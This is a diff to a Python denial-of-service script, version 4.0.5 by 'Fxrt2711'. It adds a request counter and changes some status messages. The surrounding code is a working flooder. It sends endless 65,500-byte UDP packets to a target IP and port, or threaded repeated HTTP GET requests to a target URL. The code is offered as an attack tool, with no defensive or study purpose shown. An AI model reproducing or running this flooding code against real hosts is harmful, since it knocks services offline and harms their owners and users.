@@ -1,7 +1,7 @@
 #creator: Fxrt2711
 #version: 4.0.5
 #date: 25/1/24
-#update: 29/1/24
+#update: 28/1/24
 #
 try:
     import os
@@ -52,17 +52,19 @@ def clear():
 #
 def dos_trget(target,st,portp):
 #
+    bytes_num = 0
     if st == ("ip"):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #
     while True:
+        bytes_num = bytes_num + 1
         try:
             if st == ("ip"):
                 try:
 #
                     bytes = random._urandom(65500)
                     sock.sendto(bytes,(target, portp))
-                    print(Fore.GREEN + f"bytes sended to {target}")
+                    print(Fore.GREEN + f"{bytes_num} sended to {target}")
 #
                 except:
                     try:
@@ -78,7 +80,7 @@ def dos_trget(target,st,portp):
                 rves = requests.get(target)
                 rxes = requests.get(target)
                 try:
-                    print(f"Request sented to {target}")
+                    print(f"Requests: {bytes_num} sented to {target}")
                 except:
                     exit()
 #
@@ -194,6 +196,7 @@ while True:
             pass
 #
 #
+    
     while run_threads:
         if selection_input == ("ip"):
             run_threads = False
@@ -221,6 +224,7 @@ while True:
     nothing = input("")
 #
     if not selection_input == ("ip"):
+        port = 0000
         for i in range(0, threads):
 #
             thr = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
